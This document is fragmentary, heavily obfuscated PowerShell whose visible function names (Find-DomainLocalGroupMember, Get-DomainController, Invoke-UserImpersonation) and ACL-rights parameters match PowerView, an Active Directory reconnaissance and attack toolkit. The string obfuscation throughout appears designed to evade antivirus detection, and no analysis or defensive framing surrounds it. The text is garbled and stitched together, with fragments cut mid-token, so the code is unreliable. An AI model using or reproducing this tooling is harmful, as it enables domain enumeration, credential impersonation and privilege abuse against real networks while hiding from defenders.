                                YoV{FOUndIJKCOIJKNnIJKEIJKCtiOn} JGO &(Z3b{2}{0}{1}{3}Z3b -f S5zdS5z,S5z-MS5z,S5zAdS5z,S5zemberS5z) (Z3b','{OuIJKTI',',S5zombS5z)]) { YoV{SIJKEaIJKRCheRArguMenIJKTS}[(Z3b{1}{0}{2}Z3b-f S5zoS5z,S5zTombstS5z,S5zneS5z)] = YoV{tOMIJKBIJKsToIJKNe} }
        if (YoV{PSBOUnDPAr',' -fS5zSynchronizedHS5z,S5zaS5z,S5zshS5z),(Z3b{1}{0}Z3b -fS5zeS5z,S5ztruS5z))

            
            ForEach (YoV{VIJKAR} in YoV{mIJKYVars}) {
                if (YoV{vIJKOrBIJKiDdEnvIJKArs} -NotContains YoV{VIJKAr}.Z3bNAIJKmeZ3b) {
                YoV{SIJKESSioIJKNSIJKTATE}.Z3bvariIJKAIJKBlESZ3b.(Z3b{1}{0}Z3b-fS5zddS5z,S5zAS5z).Invoke((&(Z3b{1}{0}{2}Z3b-f S5zew-S5z,S5zNS5z,S5zObjectS5z) -TypeName (Z3b{11}{7}{3}{4}{2}{12}{9}{5}{6}{10}{8}{1}{0}Z3b -fS5zableEntryS5z,S5zessionStateVariS5z,S5znt.AutomatS5z,S5znagS5z,S5zemeS5z,S5znspaS5z,S5zcS5z,S5z.MaS5z,S5zSS5z,S5zRuS5z,S5zes.S5z,S5zSystemS5z,S5zion.S5z) -ArgumentList YoV{VIJKAR}.Z3bnIJKAmeZ3b,YoV{vIJKAR}.Z3bvALIJKUeZ3b,YoV{vIJKAr}.Z3bDEsIJKcRIIJKpTIJKionZ3b,YoV{vIJKAR}.Z3bOPtIJKIOIJKNsZ3b,YoV{VIJKAR}.Z3bATTIJKRiBuIJKTEsZ3b))
                }
            }

            
            ForEach (YoV{FUnCtIIJKoN} in (&(Z3b{0}{1}{2}Z3b-f S5zGetS5z,S5z-ChildItS5z,S5zemS5z) (Z3b{2}{0}{1}Z3b -fS5zunctiS5z,S5zon:S5z,S5zFS5z))) {
                YoV{seSsiOIJKNstAIJKTE}.Z3bCOIJKMMaNIJKDSZ3b.(Z3b{0}{1}Z3b-f S5zAdS5z,S5zdS5z).Invoke((&(Z3b{0}{1}{2}Z3b-fS5zNS5z,S5zew-ObjecS5z,S5ztS5z) -TypeName (Z3b{5}{6}{7}{8}{10}{0}{9}{1}{2}{4}{3}Z3b -fS5zomation.S5z,S5zpaces.SessS5z,S5zioS5z,S5zeFunctionEntryS5z,S5znStatS5z,S5zSS5z,S5zystem.S5z,S5zManagemeS5z,S5znS5z,S5zRunsS5z,S5zt.AutS5z) -ArgumentList YoV{funIJKcTIJKiIJKOn}.Z3bnIJKAmEZ3b, YoV{fuIJKNCtIIJKOn}.Z3bDEFINIJKiIJKTiONZ3b))
            }
        }

        
        
        

        
        YoV{pIJKOOL} =   (  &(Z3b{1}{2}{0}Z3b -fS5zriabLeS5z,S5zGeS5z,S5zt-VaS5z) R26V3d ).Z3bvaIJKlueZ3b::(Z3b{4}{1}{3}{0}{2}Z3b-fS5znspS5z,S5zrS5z,S5zacePoolS5z,S5zeateRuS5z,S5zCS5z).Invoke(1, YoV{TIJKhIJKReaDs}, YoV{sesIJKsionstAIJKTE}, YoV{hIJKoSt})
        YoV{pIJKOOL}.(Z3b{1}{0}Z3b-fS5zpenS5z,S5zOS5z).Invoke()

        
        YoV{MetIJKhIJKOd} = YoV{NuIJKLl}
        ForEach (YoV{m} in  YoV{U0j}.(Z3b{0}{2}{1}{3}Z3b-f S5zGS5z,S5zthodS5z,S5zetMeS5z,S5zsS5z).Invoke() JGO &(Z3b{1}{0}{2}Z3b-fS5zherS5z,S5zWS5z,S5ze-ObjectS5z) { YoV{_}.Z3bnaIJKmeZ3b -eq (Z3b{0}{1}{2}Z3b -fS5zBeginIS5z,S5znS5z,S5zvokeS5z) }) {
            YoV{meTHIJKODPIJKARIJKAmIJKeteRs} = YoV{m}.(Z3b{3}{0}{1}{2}Z3b-fS5zParametS5z,S5zeS5z,S5zrsS5z,S5zGetS5z).Invoke()
            if ((YoV{MEIJKTHoIJKdpaIJKRAIJKMETIJKERs}.Z3bcoIJKUntZ3b -eq 2) -and YoV{MIJKETHIJKoIJKDpArAmeTIJKers}[0].Z3bNIJKAMeZ3b -eq (Z3b{1}{0}Z3b-fS5ztS5z,S5zinpuS5z) -and YoV{meTHIJKoIJKdpARIJKAmIJKeIJKTers}[1].Z3bNIJKAMeZ3b -eq (Z3b{0}{1}Z3b -fS5zoutpuS5z,S5ztS5z)) {
                YoV{mIJKeIJKThod} = YoV{m}.Z3bmAKEGEnIJKeRiIJKcmEIJKTHoDZ3b([Object], [Object])
                break
            }
        }

        YoV{JoIJKBS} = @()
        YoV{CoIJKMPuTEIJKRnAmE} = YoV{COMIJKPuteIJKRnaIJKME} JGO &(Z3b{0}{2}{1}{3}Z3b-fS5zWS5z,S5zrS5z,S5zheS5z,S5ze-ObjectS5z) {YoV{_} -and YoV{_}.(Z3b{1}{0}Z3b -f S5zimS5z,S5zTrS5z).Invoke()}
        &(Z3b{2}{1}{4}{3}{0}Z3b-f S5zeS5z,S5zteS5z,S5zWriS5z,S5zVerbosS5z,S5z-S5z) Z3b[New-ThreadedFunction] Total number of hosts: YoV(YoVComputerName.count) Z3b

        
        if (YoV{tHrIJKeIJKAdS} -ge YoV{COmIJKPIJKUTErNAIJKme}.Z3bLeIJKNgIJKTHZ3b) {
            YoV{ThrIJKeIJKAdS} = YoV{coIJKmPIJKUterNaIJKme}.Z3bLEIJKNGthZ3b
        }
        YoV{eLEIJKMeIJKNIJKTspLiIJKTsize} = [Int](YoV{cOmIJKPIJKUTeIJKRNAme}.Z3blENIJKgThZ3b/YoV{tIJKhIJKREADS})
        YoV{cOIJKmpUteRnAMIJKEPARTIJKITIIJKonEd} = @()
        YoV{stAIJKRt} = 0
        YoV{eIJKND} = YoV{eIJKLIJKEmENtIJKspLIJKItSIZE}

        for(YoV{i} = 1; YoV{i} -le YoV{tIJKHIJKREaDS}; YoV{I}++) {
            YoV{LIJKIst} = &(Z3b{1}{0}{3}{2}Z3b-f S5zew-ObjeS5z,S5zNS5z,S5ztS5z,S5zcS5z) (Z3b{7}{3}{4}{2}{8}{0}{1}{5}{6}Z3b -f S5zoS5z,S5zns.ArraS5z,S5zllecS5z,S5zm.CS5z,S5zoS5z,S5zyLiS5z,S5zstS5z,S5zSysteS5z,S5ztiS5z)
            if (YoV{I} -eq YoV{tIJKhRIJKeADs}) {
     ','  [Parameter(PoSitION = 0, VAlueFroMPIPeline = YoV{TrIJKUE}, vALUeFrOmPipELINeBYPRopErTYNamE = YoV{TrIJKUE','S5z,S5zzeS5z,S5zResultPageSS5z)] = YoV{resUIJKLIJKTIJKPaGIJKESiZE} }
        if (YoV{PsIJKBoUIJKNdPaIJKRAMEteRs}[(Z3b{1}{4}{2}{3}{0}Z3b -f S5zeLimitS5z,S5zSS5z,S5zTiS5z,S5zmS5z,S5zerverS5z)]) { YoV{seAIJKRchEIJKRarIJKgUMEnts}[(Z3b{1}{0}{3}{2}Z3b -fS5zrverTimeS5z,S5zSeS5z,S5zitS5z,S5zLimS5z)] = YoV{SeIJKRIJKVeRtIIJKmElIJKiMiT} }
        if (YoV{PSbOIJKUNDPAraMeIJKTEIJKRs}[(Z3b{2}{3}{1}{0}Z3b -fS5zsksS5z,S5zaS5z,S5zSeS5z,S5zcurityMS5z)]) { YoV{SEIJKAIJKRcherarguIJKMIJKeIJKNtS}[(Z3b{0}{2}{1}Z3b -f S5zSecuS5z,S5zityMasksS5z,S5zrS5z)] = YoV{SIJKeIJKCURitYIJKMIJKASKs} }
        if (YoV{PSBouNDpARAIJKMIJKEIJKTIJKers}[(Z3b{0}{2}{1}Z3b -f S5zTombsS5z,S5zeS5z,S5ztonS5z)]) { YoV{SIJKEaRIJKcHeRArgumIJKENIJKTs}[(Z3b{2}{0}{1}Z3b -fS5zmbstonS5z,S5zeS5z,S5zToS5z)] = YoV{TIJKomIJKBstIJKoNe} }
        if (YoV{pSBOuNIJKdpARAIJKMetIJKeRS}[(Z3b{2}{1}{0}Z3b-fS5zialS5z,S5zredentS5z,S5zCS5z)]) { YoV{SeIJKArcHIJKeRarIJKgUIJKMENIJKTs}[(Z3b{1}{0}{2}Z3b -f S5zedentiS5z,S5zCrS5z,S5zalS5z)] = YoV{cReDEIJKNIJKTiAl} }
        YoV{UIJKsIJKeRSeaIJKRIJKcher} = &(Z3b{0}{4}{1}{2}{3}Z3b-f S5zGet-DS5z,S5zSeS5z,S5zaS5z,S5zrcherS5z,S5zomainS5z) @SearcherArguments
    }

    PROCESS {
        
        if (YoV{PsIJKBIJKOUNdPIJKArIJKAmIJKEtErs} -and (YoV{pIJKsbOuNDPARIJKAmIJKeTErs}.Z3bcOIJKUNtZ3b -ne 0)) {
            &(Z3b{2}{1}{4}{0}{3}Z3b-fS5zametS5z,S5z-DynamiS5z,S5zNewS5z,S5zerS5z,S5zcParS5z) -CreateVariables -BoundParameters YoV{PsIJKBIJKoUnIJKdParaMetIJKEIJKRs}
        }

        if (YoV{UsERIJKseaIJKRIJKCHIJKEr}) {
            YoV{iIJKDENTiTIJKYFiLTIJKER} = S5zS5z
            YoV{fIJKilIJKTeR} = S5zS5z
            YoV{idEIJKNTIIJKTy} JGO &(Z3b{0}{2}{1}Z3b-f S5zWhere-ObS5z,S5zctS5z,S5zjeS5z) {YoV{_}} JGO &(Z3b{1}{0}{2}{3}Z3b-fS5zbS5z,S5zForEach-OS5z,S5zjecS5z,S5ztS5z) {
                YoV{IDenIJKTiTyINsTaIJKNIJKCe} = YoV{_}.(Z3b{1}{2}{0}Z3b-f S5zeS5z,S5zRS5z,S5zeplacS5z).Invoke(S5z(S5z, S5z5rj28S5z).(Z3b{1}{0}Z3b-fS5zplaceS5z,S5zReS5z).Invoke(S5z)S5z, S5z5rj29S5z)
                if (YoV{IDEnIJKTITIJKyIIJKNIJKSTanCE} -match (Z3b{0}{1}Z3b -f S5z^S-S5z,S5z1-S5z)) {
                    YoV{IDIJKENtIJKItYFilIJKTER} += Z3b(objectsid=YoVIdentityInstance)Z3b
                }
                elseif (YoV{IdIJKEIJKNTItyiIJKNsTancE} -match (Z3b{0}{1}Z3b-fS5z^CNS5z,S5z=S5z)) {
                    YoV{idENtIIJKTIJKyFIJKILIJKTER} += Z3b(distinguishedname=YoVIdentityInstance)Z3b
                    if ((-not YoV{PsbOuNdPIJKArIJKAIJKmEIJKTIJKERS}[(Z3b{1}{0}Z3b -f S5zmainS5z,S5zDoS5z)]) -and (-not YoV{PIJKSIJKBoUnIJKDParaIJKmEtEIJKRS}[(Z3b{2}{1}{0}Z3b -f S5zhBaseS5z,S5zcS5z,S5zSearS5z)])) {
                        
                        
                        YoV{IDENtiIJKTIJKyDIJKomAIn} = YoV{iIJKdenTiTIJKyIJKINStancE}.(Z3b{1}{0}{2}Z3b -fS5zubStrS5z,S5zSS5z,S5zingS5z).Invoke(YoV{IIJKDIJKEnTITYInStAIJKNIJKCe}.(Z3b{1}{0}Z3b-f S5zfS5z,S5zIndexOS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS','APFilterZ3b)
                    YoV{FIIJKLTER} +','IJKRAMetERs}[(Z3b{2}{3}{1}{0}Z3b -f S5zesS5z,S5ztiS5z,S5zPropeS5z,S5zrS5z)]) { YoV{SEaIJKRcIJKHeraRgIJKUMeNTs}[(Z3b{0}{2}{3}{1}Z3b -fS5zPrS5z,S5ztiesS5z,S5zopeS5z,S5zrS5','     YoV{seRIJKVer},

        [ValidateSet({Z3b{0}{1}Z3b-fS5zBaS5z,S5zseS5z}, {Z3b{2}{1}{0}Z3b-fS5zeLevelS5z,S5znS5z,S5zOS5z}, {Z3b{0}{1}Z3b-f S5zSuS5z,S5zbtreeS5z})]
        [String]
        YoV{SEIJKARChIJKSCOPe} = (Z3b{2}{0}{1}Z3b -f S5zbtS5z,S5zreeS5z,S5zSuS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{ReSultIJKPaIJKGEIJKSizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{ServeIJKRTiIJKMeLiIJKmIJKiT},

        [Switch]
        YoV{TOIJKmbIJKSTIJKONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{credIJKENIJKTiAl} =   (  &(Z3b{3}{2}{0}{1}Z3b -f S5z-chILDS5z,S5ziTeMS5z,S5zTS5z,S5zGeS5z)  varIAbLE:Jfi  ).Z3bvalIJKUEZ3b::Z3bEmpIJKTYZ3b
    )

    BEGIN {
        YoV{seIJKAIJKRCIJKHERARGumENIJKTs} = @{
            (Z3b{0}{2}{1}Z3b-f S5zLS5z,S5zlterS5z,S5zDAPFiS5z) = ((Z3b{3}{9}{0}{10}{4}{1}{2}{8}{6}{7}{5}Z3b -fS5z=*S5z,S5zpe:1.2.840S5z,S5z.1S5z,S5z(&(managedS5z,S5zoupTyS5z,S5z3648))S5z,S5z=214S5z,S5z748S5z,S5z13556.1.4.803:S5z,S5zByS5z,S5z)(grS5z))
            (Z3b{3}{2}{0}{1}Z3b-f S5zpertiS5z,S5zesS5z,S5zoS5z,S5zPrS5z) = (Z3b{2}{14}{4}{10}{3}{11}{1}{8}{13}{7}{0}{12}{9}{15}{5}{6}Z3b-fS5znttype,S5z,S5zcS5z,S5zdistinguishedNS5z,S5zaS5z,S5zmeS5z,S5zuntnS5z,S5zameS5z,S5zuS5z,S5zcS5z,S5zaS5z,S5z,mS5z,S5znagedBy,samaS5z,S5zsS5z,S5zoS5z,S5zaS5z,S5zmaccoS5z)
        }
        if (YoV{psIJKBOUnDPaIJKRaMIJKEIJKTEIJKRS}[(Z3b{0}{1}{2}Z3b -fS5zSS5z,S5zeS5z,S5zarchBaseS5z)]) { YoV{SeIJKAIJKRcIJKhIJKeRIJKArguMenTs}[(Z3b{1}{2}{0}Z3b -fS5zchBaseS5z,S5zSS5z,S5zearS5z)] = YoV{SIJKEIJKARChBase} }
        if (YoV{PsbOunIJKDpaRAIJKMETIJKErS}[(Z3b{0}{1}{2}Z3b -f S5zServS5z,S5zeS5z,S5zrS5z)]) { YoV{SeArCIJKHIJKERAIJKRIJKGuMENtS}[(Z3b{0}{1}Z3b-fS5zSS5z,S5zerverS5z)] = YoV{SerIJKVER} }
        if (YoV{pSIJKBOunDpaRAmEIJKTeIJKRs}[(Z3b{1}{2}{0}Z3b-f S5zcopeS5z,S5zSeS5z,S5','f S5zeS5z,S5zstnamS5z,S5zdnshS5z,S5zoS5z)
        }
        &(Z3b{1}{0}{3}{2}Z3b -f S5zteS5z,S5zWriS5z,S5zerboseS5z,S5z-VS5z) Z3b[Find-DomainLocalGroupMember] TargetComputers length: YoV(YoVTargetComputers.Length) Z3b
        if (YoV{TAIJKRgeTCoMPuIJKTEIJKRs}.Z3bLENGIJKTHZ3b -eq 0) {
            throw (Z3b{0}{16}{2}{11}{4}{6}{13}{3}{15}{9}{5}{10}{7}{14}{1}{12}{8}Z3b-fS5z[S5z,S5zmeS5z,S5zindS5z,S5zNo hosS5z,S5zcalGroupMembeS5z,S5zoS5z,S5zr]S5z,S5znd S5z,S5zateS5z,S5zs fS5z,S5zuS5z,S5z-DomainLoS5z,S5zrS5z,S5z S5z,S5zto enuS5z,S5ztS5z,S5zFS5z)
        }

        
        YoV{HIJKOstIJKEnumblIJKock} = {
            Param(YoV{CoMpUIJKTIJKERnaIJKME}, YoV{GrIJKouPIJKNIJKAMe}, YoV{meTIJKHIJKoD}, YoV{tOIJKkeIJKNHAndLe})

            
            if (YoV{GROIJKUPIJKNIJKAMe} -eq (Z3b{2}{1}{0}{4}{3}Z3b-fS5zinisS5z,S5zdmS5z,S5zAS5z,S5zsS5z,S5ztratorS5z)) {
                YoV{adMInIJKsECIJKUIJKRITyidEIJKNIJKTiFiEr} = &(Z3b{3}{1}{2}{0}Z3b-f S5ztS5z,S5zew-OS5z,S5zbjecS5z,S5zNS5z) (Z3b{11}{8}{1}{3}{4}{9}{0}{6}{7}{10}{5}{2}Z3b -f S5zlS5z,S5zem.SS5z,S5zrS5z,S5zecuS5z,S5zrity.PrS5z,S5zieS5z,S5z.SecuritS5z,S5zyIdS5z,S5ztS5z,S5zincipaS5z,S5zentifS5z,S5zSysS5z)( (  &(Z3b{3}{1}{2}{0}Z3b-f S5zriabLeS5z,S5zt-vS5z,S5zaS5z,S5zgES5z)  6ImZ  ).Z3bvalIJKUEZ3b::Z3bbIJKUILtinIJKAdmInISTIJKRatIJKOrIJKSIJKsIdZ3b,YoV{nuIJKLl})
                YoV{GroUIJKPIJKNAMe} = (YoV{ADIJKMinseCurIIJKTIJKYIJKiIJKDEntIJKifIER}.Z3bTrANIJKSIJKLAteZ3b([System.Security.Principal.NTAccount]).Z3bvAlIJKUEZ3b -split Z3b5rj5rjZ3b)[-1]
            }

            if (YoV{TIJKOKIJKENhaNDle}) {
                
                YoV{NuIJKLL} = &(Z3b{1}{6}{4}{2}{3}{0}{5}Z3b-f S5zrsonatiS5z,S5zInvS5z,S5zpS5z,S5zeS5z,S5zke-UserImS5z,S5zonS5z,S5zoS5z) -TokenHandle YoV{ToIJKKeIJKNhaIJKNdLE} -Quiet
            }

            ForEach (YoV{TIJKArGEtIJKCIJKoMIJKpUter} in YoV{CoIJKMpUtEIJKRNIJKAmE}) {
                YoV{uIJKp} = &(Z3b{3}{1}{4}{2}{0}Z3b-f S5znS5z,S5zest-ConS5z,S5ztioS5z,S5zTS5z,S5znecS5z) -Count 1 -Quiet -ComputerName YoV{tArIJKGIJKETCoMpUIJKTer}
                if (YoV{uIJKp}) {
                    YoV{nETIJKlIJKocalgrOUpIJKMeMbERIJKARIJKgumentS} = @{
                        (Z3b{0}{1}{3}{2}Z3b -fS5zComputS5z,S5zeS5z,S5zNameS5z,S5zrS5z) = YoV{taIJKRGETComIJKpUTeR}
                        (Z3b{1}{0}Z3b -f S5zodS5z,S5zMethS5z) = YoV{mETHIJKoD}
                        (Z3b{','3b{2}{0}{1}Z3b-fS5zomaS5z,S5zinS5z,S5zGetDS5z).Invoke(YoV{DOmaIIJKNCOIJKNIJKTEXt})
            }
            catch {
                &(Z3b{2}{1}{0}Z3b -fS5zseS5z,S5z-VerboS5z,S5zWriteS5z) (S5z[S5z+S5zGet-DomainS5z+S5z] S5z+S5zTheS5z+S5z S5z+S5zsS5z+S5zpecifS5z+S5zied S5z+S5zdS5z+S5zomainS5z+S5z S5z+Z3bS5zYoVDomainS5z Z3b+S5zdoeS5z+S5zs S5z+S5znoS5z+S5zt S5z+S5zeS5z+S5zxisS5z+S5zt, S5z+S5zcS5z+S5zouldS5z+S5z S5z+S5znoS5z+S5zt S5z+S5zbeS5z+S5z S5z+S5zcS5z+S5zonS5z+S5ztacted, S5z+S5zoS5z+S5zr S5z+S5zthereS5z+S5z S5z+((S5zisnyk8S5z+S5ztS5z+S5z S5z)  -cREplAcES5zyk8S5z,[CHAr]39)+S5zanS5z+S5z S5z+S5zexistS5z+S5zing S5z+S5ztrustS5z+S5z S5z+S5z: S5z+Z3bYoV_Z3b)
            }
        }
        else {
            try {
                  ( &(S5zlSS5z)  (Z3bVaRiaZ3b+Z3bBLE:uZ3b+Z3b1Z3b+Z3bx0WVZ3b) ).Z3bValIJKUeZ3b::(Z3b{4}{1}{0}{2}{3}Z3b -fS5zrS5z,S5zrS5z,S5zentS5z,S5zDomainS5z,S5zGetCuS5z).Invoke()
            }
            catch {
                &(Z3b{1}{4}{0}{2}{3}Z3b-f S5zbS5z,S5zWrite-VeS5z,S5zosS5z,S5zeS5z,S5zrS5z) (S5z[S5z+S5zGet-DS5z+S5zoS5z+S5zmS5z+S5zain] S5z+S5zErS5z+S5zror S5z+S5zretriS5z+S5zevinS5z+S5zg S5z+S5zthS5z+S5ze S5z+S5zcS5z+S5zurrS5z+S5zent S5z+S5zdoS5z+S5zmaiS5z+S5zn: S5z+Z3bYoV_Z3b)
            }
        }
    }
}


function GEIJKT-DOMaInIJKcIJKOIJKNtRoIJKLlEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{0}{2}{3}Z3b -f S5zoceS5z,S5zPSShouldPrS5z,S5zsS5z,S5zsS5z}, S5zS5z)]
    [OutputType({Z3b{4}{0}{1}{3}{2}Z3b-f S5zVieS5z,S5zw.CS5z,S5zmputerS5z,S5zoS5z,S5zPowerS5z})]
    [OutputType({Z3b{5}{4}{13}{1}{2}{8}{6}{9}{0}{3}{7}{10}{11}{12}Z3b -fS5zrectS5z,S5zoryS5z,S5zServicesS5z,S5zory.DoS5z,S5zecS5z,S5zSystem.DirS5z,S5zActS5z,S5zmaS5z,S5z.S5z,S5ziveDiS5z,S5zinConS5z,S5ztS5z,S5zrollerS5z,S5ztS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTIOn = 0, valUefrompIPeLiNE = YoV{trIJKUE})]
        [String]
        YoV{DOIJKMIJKAin},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{4}{1}{0}{2}{3}Z3b-f S5zntroS5z,S5zoS5z,S5zllS5z,S5zerS5z,S5zDomainCS5z})]
        [String]
        YoV{sIJKeIJKRver},

        [Switch]
        YoV{LdIJKAp},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CREIJKdeNtIJKIAL} =   ( &(Z3b{0}{2}{1}Z3b -fS5zVAriS5z,S5zeS5z,S5zAbLS5z)  (S5zJFS5z+S5ziS5z)  -va )::Z3bEmIJKpTYZ3b
    )

    PROCESS {
        YoV{aIJKRIJKgumeNTs} = @{}
        if (YoV{pSBIJKoUndPIJKArAMeTIJKeRS}[(Z3b{0}{2}{1}Z3b-f S5zDS5z,S5zmainS5z,S5zoS5z)]) { YoV{AIJKRGIJKUmeNtS}[(Z3b{1}{0}Z3b-fS5zinS5z,S5zDomaS5z)] = YoV{DIJKOmaIN} }
        if (YoV{psboIJKUndPIJKARIJKAmEtEIJKRS}[(Z3b{0}{1}{2}Z3b ','5z,S5zropeS5z) (Z3b{0}{2}{1}{3}Z3b-fS5zGroS5z,S5zpNS5z,S5zuS5z,S5zameS5z) YoV{grIJKOuIJKpNIJKAmE}
                            YoV{meIJKM','ObIJKjIJKEIJKCt} JGO &(Z3b{1}{2}{3}{0}Z3b-f S5zberS5z,S5zAddS5z,S5z-MS5z,S5zemS5z) (Z3b{3}','      [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CrEIJKDIJKenTial} =  ( &(Z3b{2}{0}{1}','KRIJKAmETIJKerS}[(Z3b{1}{0}Z3b -f S5zelayS5z,S5zDS5z)] -or YoV{PsIJKBIJKOunDpaIJKRAmetIJKerS}[(Z3b{1}{2}{0}{3}Z3b -f S5zuS5z,S5zStopOS5z,S5znSS5z,S5zccessS5z)]) {

            &(Z3b{1}{3}{0}{2}Z3b-f S5z-VS5z,S5zWrS5z,S5zerboseS5z,S5ziteS5z) Z3b[Find-DomainLocalGroupMember] Total number of hosts:','aR]110+[chaR]79+[chaR]69),[chaR]39 -CRePlaCE  S5z8RbS5z,[chaR]36)+S5zanS5z+S5zd S5z+(S5z@S5z+S5zSyS5z+S5zstemTimS5z+S5ze&lt;=gS5z+S5zqMK3l(K3S5z+S5zlEndTS5z','S}[(Z3b{2}{0}{1}Z3b-f S5zmS5z,S5zainS5z,S5zDoS5z)] = YoV{cOMIJKPuteIJKRdomaIN} }
        if (YoV{pSbOIJKUNIJKdParIJKAMIJKetEIJKRs}[(Z3b{0}{3}{2}{1}Z3b-fS5zComputeS5z,S5zerS5z,S5zDAPFiltS5z,S5zrLS5z)]) { YoV{cOMPutIJKeIJKRIJKsIJKEIJKArcIJKhERArgUMeNts}[(Z3b{2}{0}{3}{1}Z3b-f S5zFiS5z,S5zrS5z,S5zLDAPS5z,S5zlteS5z)] = YoV{CoMPIJKUtErlIJKDAIJKpIJKFiLtEr} }
        if (YoV{pIJKSBoUnIJKdpIJKAIJKRametEIJKRs}[(Z3b{4}{1}{2}{0}{3}Z3b -f S5zarchBS5z,S5zutS5z,S5zerSeS5z,S5zaseS5z,S5zCompS5z)]) { YoV{COIJKMputeIJKRSIJKeAIJKRCHERAIJKRGUMeIJKNIJKTS}[(Z3b{2}{1}{0}Z3b -f S5zseS5z,S5zarchBaS5z,S5zSeS5z)] = YoV{CIJKoMpIJKUTErSEArIJKcHBAIJKSe} }
        if (YoV{PSbouNDPIJKArAMIJKeIJKTerS}[(Z3b{3}{2}{1}{0}Z3b -fS5znedS5z,S5ztraiS5z,S5znsS5z,S5zUncoS5z)]) { YoV{CoMpIJKUTEIJKRIJKsEARcIJKHerarguIJKMeNIJKTS}[(Z3b{2}{3}{1}{0}Z3b -f S5zrainedS5z,S5zstS5z,S5zUS5z,S5znconS5z)] = YoV{uNCIJKOnstRIJKAINIJKed} }
        if (YoV{pIJKSboUIJKNdPAIJKRaIJKMIJKEtErS}[(Z3b{3}{5}{1}{2}{4}{0}Z3b-fS5zemS5z,S5zpeS5z,S5zratinS5z,S5zComputerS5z,S5zgSystS5z,S5zOS5z)]) { YoV{cOmpIJKUIJKTIJKeIJKRsEarCheIJKRARguIJKMEIJKNIJKTs}[(Z3b{2}{0}{1}{3}Z3b -fS5zrS5z,S5zatiS5z,S5zOpeS5z,S5zngSystemS5z)] = YoV{OpEIJKRATiNgIJKsYSIJKTEm} }
        if (YoV{PIJKsIJKBOunDIJKparaIJKMeteRS}[(Z3b{3}{1}{2}{0}Z3b -f S5zackS5z,S5zputerS5z,S5zServicePS5z,S5zComS5z)]) { YoV{coIJKmIJKpUTIJKerIJKsEARcIJKHeRaRgUMENtS}[(Z3b{1}{2}{0}Z3b-f S5zicePackS5z,S5zSS5z,S5zervS5z)] = YoV{SeIJKRIJKVIJKIcePaCK} }
        if (YoV{pSBoUIJKNdpa','S5z}S5z+S5zES5z+S5zndTime.S5z+S5zToUS5z+S5znS5z+S5zivS5z+S5zersS5z+S5zalS5z+S5zTime(S5z+S5z).TS5z+S5zoString({0}sS5z+S5z{S5z+S5z0}S5z+S5z','tIJKARGETIJKPIJKAtH} in YoV{pIJKATHS}) {
            &(Z3b{3}{1}{0}{2}Z3b -f S5zeS5z,S5zte-VS5z,S5zrboseS5z,S5zWriS5z) (S5z[S5z+S5zRemove-RemoteS5z+S5zCoS5z+S5znneS5z+S5zcS5z+S5ztion] S5z+S5zAS5z+S5zttemptS5z+S5zing S5z+S5ztS5z+S5zo S5z+S5zunmoS5z+S5zunS5z+S5ztS5z+S5z: S5z+Z3bYoVTargetPathZ3b)
            YoV{RIJKEsuLT} = YoV{MIJKPR}::(Z3b{2}{4}{1}{3}{0}Z3b-fS5zion2S5z,S5zcS5z,S5zWNetCanceS5z,S5ztS5z,S5zlConneS5z).Invoke(YoV{tIJKArgEtPIJKAtH}, 0, YoV{tIJKRUE})

            if (YoV{rIJKEIJKSUlt} -eq 0) {
                &(Z3b{2}{3}{0}{1}Z3b-f S5zVeS5z,S5zrboseS5z,S5zWriS5z,S5zte-S5z) (Z3bYoVTargetPath Z3b+S5zsuccesS5z+S5zsfulS5z+S5zly S5z+S5zummS5z+S5zounS5z+S5ztedS5z)','tS5z},{Z3b{1}{3}{0}{2}Z3b-f S5zbS5z,S5zLisS5z,S5zjectS5z,S5ztOS5z},{Z3b{1}{0}{3}{2}Z3b -f S5zCoS5z,S5zReadS5z,S5zrolS5z,S5zntS5z},{Z3b{3}{2}{0}{1}Z3b-f S5zerS5z,S5ztyS5z,S5zadPropS5z,S5zReS5z},{Z3b{1}{0}Z3b-fS5zlfS5z,S5zSeS5z},{Z3b{3}{1}{2}{0}Z3b-fS5zronizeS5z,S5znS5z,S5zchS5z,S5zSyS5z},{Z3b{2}{1}{0}Z3b -fS5ziteDaclS5z,S5zrS5z,S5zWS5z},{Z3b{3}{0}{2}{1}Z3b -fS5ziS5z,S5zOwnerS5z,S5zteS5z,S5zWrS5z},{Z3b{2}{1}{0}{3}Z3b -f S5zopertS5z,S5zrS5z,S5zWritePS5z,S5zyS5z})]
        YoV{RIJKigIJKHT},

        [Parameter(MaNDatOrY = YoV{TIJKRue}, PaRamEteRSETName=Z3bAccIJKEsSrULIJKETyIJKpEZ3b)]
        [ValidateSet({Z3b{0}{1}Z3b -fS5zAlS5z,S5zlowS5z}, {Z3b{1}{0}Z3b -fS5zenyS5z,S5zDS5z})]
        [String[]]
        YoV{AIJKCIJKceSScIJKoIJKNTrOLTIJKyPe},

        [Parameter(manDaTOry = YoV{TIJKRuE}, PaRaMEteRSetNAme=Z3baIJKUdIJKITruIJKLeTyPeZ3b)]
        [ValidateSet({Z3b{1}{0}Z3b-f S5zessS5z,S5zSuccS5z}, {Z3b{2}{1}{0}Z3b -f S5zlureS5z,S5zaiS5z,S5zFS5z})]
        [String]
        YoV{AUditIJKFIJKLaG},

        [Parameter(manDATorY = YoV{FAIJKLIJKsE}, ParAMeTERSEtName=Z3baccESIJKSIJKRUleTIJKypEZ3b)]
        [Parameter(MAnDatORY = YoV{faIJKLSe}, pArAMetERSetName=Z3bAIJKUIJKDiIJKTrULetYpEZ3b)]
        [Parameter(MaNDATOry = YoV{fIJKALSe}, pARAMEtErSeTnAMe=Z3boBJeIJKCTIJKGuiIJKdlooIJKKUpZ3b)]
        [Guid]
        YoV{obJEIJKCIJKTIJKTypE},

